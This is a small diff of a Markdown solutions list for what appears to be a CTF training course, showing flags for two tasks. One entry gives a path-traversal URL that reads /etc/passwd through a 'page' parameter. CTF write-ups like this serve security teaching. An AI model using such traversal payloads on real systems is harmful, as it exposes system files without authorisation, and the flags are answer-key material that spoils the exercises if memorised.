@@ -136,5 +136,6 @@ Link to [course](https://course.ugractf.ru)
 (`ugra_i_have_many_dollars_45673a5db6e0`)
 
 **Задача B. Точечный удар**
+
 https://dotted.board.course.ugractf.ru/57666eb99dbbca9b/files.php?page=../../../../etc/passwd
 (`ugra_dot_dot_is_win_9ed3ca85a76c`)
